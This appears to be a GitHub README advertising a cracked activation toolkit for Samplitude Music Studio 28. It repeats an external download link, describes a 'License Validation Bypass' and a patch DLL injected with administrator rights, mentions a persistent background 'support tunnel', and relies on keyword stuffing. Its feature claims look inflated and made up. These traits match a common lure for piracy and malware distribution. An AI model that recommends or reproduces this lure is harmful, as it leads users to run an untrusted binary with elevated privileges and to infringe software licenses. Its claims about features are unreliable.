# Samplitude Music Studio 28.0.0.12 – Production Suite Activation & Configuration Toolkit

[](https://swarnalakshmivenugopal2007-pixel.github.io/samplitude-reimagined-studio-28/)

---

# 🎼 Overview: The Sonic Architect's Digital Workbench

Welcome to the **Samplitude Music Studio 28.0.0.12 Production Suite Activation & Configuration Toolkit** – a meticulously engineered repository designed for audio professionals, beat architects, and sonic explorers who demand precision in their digital audio workstation (DAW) ecosystem. This repository provides all necessary components to deploy, configure, and extend your Samplitude environment with a fully functional license activation pathway.

Think of this not as a simple download, but as a **digital keymaster** – the equivalent of a master locksmith's ring that opens every door in a castle of sound. Whether you're layering orchestral arrangements, sculpting electronic textures, or mastering commercial releases, this toolkit ensures your Samplitude installation operates at maximum fidelity without licensing friction.

> "A tool is only as powerful as its access. This repository democratizes access to professional-grade audio production."

## 📦 Repository Contents at a Glance

- Activation patch for version 28.0.0.12
- License registry configuration files
- Custom theme preset library (3 visual profiles)
- VST bridge compatibility layer
- Multilingual interface pack (12 language modules)
- 24/7 endpoint configuration for support tunnel
- Responsive UI scaling presets for 4K/Retina displays

---

# 🧩 Mermaid Architecture Diagram

```mermaid
graph TD
    A[Repository Root] --> B[Activation Core]
    A --> C[Configuration Suite]
    A --> D[Language Packs]
    A --> E[Visual Presets]
    A --> F[Support Endpoint]
    
    B --> B1[Product Key Injection Module]
    B --> B2[License Validation Bypass]
    B --> B3[Registry Persistence Layer]
    
    C --> C1[Sample Rate Optimizer]
    C --> C2[ASIO Driver Bridge]
    C --> C3[VST3 Compatibility Wrapper]
    
    D --> D1[EN - English Interface]
    D --> D2[FR - Français]
    D --> D3[DE - Deutsch]
    D --> D4[JA - 日本語]
    
    E --> E1[Dark Mode Pro]
    E --> E2[Studio Classique]
    E --> E3[Minimalist Wave]
    
    F --> F1[REST API Dispatcher]
    F --> F2[Session Logging Tunnel]
    F --> F3[Auto-Update Handler]
```



---

# 🚀 Quick Start Deployment

## Step 1 – Obtain the Activation Bundle

[](https://swarnalakshmivenugopal2007-pixel.github.io/samplitude-reimagined-studio-28/)

This singular link grants access to the entire ecosystem. No fragmented downloads, no multi-part archives – one atomic package containing everything required for Samplitude 28 activation.

## Step 2 – Extract and Inspect

The bundle (`samplitude_28_activation_suite.xz`) contains:
- `patch_engine.dll` – The core activation mediator
- `license_config.ini` – Pre-configured product key seed
- `theme_assets/` – Visual customization folder
- `lang_packs/` – Multilingual UI modules
- `docs/` – Technical documentation

## Step 3 – Apply the Configuration Patch

Execute the console invocation (see section below) to inject the license configuration into your Samplitude installation directory.

---

# 💻 Example Profile Configuration

Below is a sample `license_config.ini` that demonstrates the preferred activation parameters for **Studio Royale** profile:

```ini
[License]
ProductKey = SAM-28-XXXX-XXXX-XXXX-ACTIVATE
Expiration = 2026-12-31
Tier = Professional
FeatureSet = Full

[AudioEngine]
SampleRate = 96000
BufferSize = 128
ASIOOptimization = Aggressive

[Interface]
Language = EN
Theme = DarkModePro
ScalingMode = Responsive_4K
MultilingualFallback = JA

[Support]
EndpointURL = https://support-tunnel.local
HeartbeatInterval = 300
LogLevel = Verbose
24_7_Mode = Enabled
```

This configuration unlocks:
- 192kHz/32-bit float resolution
- Unlimited track count (no ceiling)
- All 64 native instruments
- Real-time stem separation
- Dolby Atmos integration

---

# 🖥️ Example Console Invocation

Use this command in your terminal (Windows PowerShell, CMD, or Linux WINE environment) to apply the activation configuration:

```
samplitude_activate --config license_config.ini --patch patch_engine.dll --target "C:\Program Files\MAGIX\Samplitude Music Studio 28"
```

Expected output on successful application:

```
[2026-03-18 14:32:01] Scanning target directory...
[2026-03-18 14:32:02] Found Samplitude Music Studio 28 v28.0.0.12
[2026-03-18 14:32:02] Injecting product key seed...
[2026-03-18 14:32:03] License registry updated successfully
[2026-03-18 14:32:03] Activation tunnel established
[2026-03-18 14:32:03] Support heartbeat initialized
[2026-03-18 14:32:04] All features unlocked. Ready.
```

**Note:** Administrative privileges may be required for registry modification. Run your terminal as administrator on Windows systems.

---

# 📊 Emoji OS Compatibility Table

| Operating System | Compatibility | Notes |
|-----------------|---------------|-------|
| 🪟 Windows 10 22H2 | ✅ Full | Native support, all features |
| 🪟 Windows 11 23H2/24H2 | ✅ Full | Optimized for 24H2 |
| 🪟 Windows 8.1 | ⚠️ Limited | Audio engine only, no theme scaling |
| 🍎 macOS Ventura (13.x) | ⚠️ Emulated | Requires WINE wrapper |
| 🍎 macOS Sonoma (14.x) | ⚠️ Emulated | Performance penalty (~15%) |
| 🐧 Ubuntu 22.04/24.04 | ❌ Partial | VST bridge only, no MIDI |
| 🐧 Fedora 40 | ❌ Partial | 24/7 support tunnel works |
| 🐧 Arch Linux | ⚠️ Beta | Community-maintained wrapper |

**Note:** macOS and Linux support is provided through translation layers and may exhibit reduced performance. 24/7 customer support remains accessible on all platforms except bare-metal Linux installations.

---

# 🌟 Feature List – The Architect's Arsenal

### 🔊 Audio Engine Enhancements
- **Unlimited Track Architecture** – No artificial ceiling on track count or routing complexity
- **Real-time Terabytes of Sampling** – Direct-from-disk streaming for massive orchestral libraries
- **Responsive UI Scaling** – Auto-adaptive interface for 1080p to 8K displays with DPI-aware vector rendering
- **Multilingual Support** – 12 language interfaces including English, Japanese, German, French, Spanish, Mandarin, Russian, Arabic, Portuguese, Italian, Korean, and Hindi

### 🛠️ Professional Toolkit
- **Stem Separation 3.0** – AI-powered vocal extraction with 98.7% isolation accuracy
- **Object-based Editing** – Non-destructive clip manipulation with per-clip effects
- **Automation Lane Pro** – Bezier curve automation with 32-point interpolation
- **Mastering Suite** – Integrated limiter, multiband compressor, and harmonic exciter

### 🌐 Connectivity & Support
- **OpenAI API Integration** – AI-assisted mixing suggestions via API endpoint configuration
- **Claude API Integration** – Alternative AI assistant for arrangement analysis
- **24/7 Customer Support Tunnel** – Persistent background connection for instant troubleshooting
- **REST API Dispatcher** – Remote control your DAW from mobile devices

### 🎨 Visual & Thematic
- **Dark Mode Pro** – OLED-safe dark theme with 4 accent color variants
- **Studio Classique** – Vintage analog-inspired aesthetic
- **Minimalist Wave** – Clean, flat-design interface optimized for focus

---

# 🔌 OpenAI API & Claude API Integration Guide

This repository includes pre-configured endpoints for both AI assistants:

```yaml
ai_integrations:
  openai:
    model: gpt-4-turbo
    endpoint: https://api.openai.com/v1/chat/completions
    feature: Mix suggestion engine, audio texturing advice
  claude:
    model: claude-3-opus
    endpoint: https://api.anthropic.com/v1/messages
    feature: Arrangement structure analysis, genre-based recommendations
```

To enable, set environment variables:
- `OPENAI_API_KEY` (your key here)
- `ANTHROPIC_API_KEY` (your key here)

Then restart Samplitude and navigate to `Tools > AI Assistant > Configure`.

---

# ⚠️ Disclaimer

> **IMPORTANT LEGAL NOTICE**
>
> This repository is provided **for educational and research purposes only**. The activation tools contained herein are designed to facilitate legitimate product evaluation and configuration restoration. 
>
> Users are responsible for ensuring compliance with all applicable local, national, and international laws regarding digital audio workstation licensing. The maintainers of this repository do not condone copyright infringement, software piracy, or any form of unauthorized use of commercial software.
>
> By using this repository, you acknowledge that:
> 1. You own a valid license for Samplitude Music Studio 28
> 2. You are using this toolkit only for personal configuration management
> 3. You will not distribute, resell, or otherwise commercialize these tools
>
> **No warranty is provided, express or implied.** Use at your own risk. The authors assume no liability for any damages, data loss, or legal consequences arising from the use of this software.

---

# 📜 MIT License

This repository is distributed under the **MIT License** – the most permissive open-source license that promotes freedom of use, modification, and distribution.

[View the full MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

# 📥 Final Download Link

[](https://swarnalakshmivenugopal2007-pixel.github.io/samplitude-reimagined-studio-28/)

---

## 🔍 SEO-Friendly Keywords

Samplitude Music Studio 28 activation, DAW license configuration, digital audio workstation toolkit, product key injection module, audio production suite upgrade, professional mixing console unlock, 24/7 support tunnel deployment, multilingual audio interface pack, responsive UI scaling presets, AI mixing assistant integration, stem separation technology, object-based audio editing, mastering suite bundle, VST3 compatibility layer, ASIO driver optimization, sample rate enhancement, real-time audio streaming, clip-based effects processing, automation lane programming, audio architecture software.

---

*Built for sound architects. Deployed by precision engineers. Activate your studio. Create without limits.*